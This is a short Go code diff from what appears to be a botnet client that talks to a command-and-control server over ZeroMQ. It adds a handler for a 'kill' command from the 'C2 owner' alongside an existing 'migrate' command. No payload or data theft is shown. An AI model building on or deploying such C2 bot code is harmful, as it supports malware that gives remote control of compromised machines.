@@ -346,6 +346,10 @@ func dealerhandle(dealer *zmq.Socket, dealdown chan<- struct{}, dealmigsignal ch
 			dealer.SendMessage("h")
 		}
 
+		if res[0] == "kill" {
+			log.Fatalln("killed by C2 owner")
+		}
+
 		if len(res) == 3 {
 			if res[0] == "migrate" {
 				var details postC2info
@@ -370,6 +374,7 @@ func subhandler(subscriber *zmq.Socket, C2ip, bot, bport, connid string, subdown
 	log.Printf("subscribed to the %s channel\n", bot)
 	for {
 		message, err := subscriber.Recv(0)
+
 		if err != nil {
 			log.Printf("subscriber channel: %s\n", err)
 			subscriber.SetLinger(0)
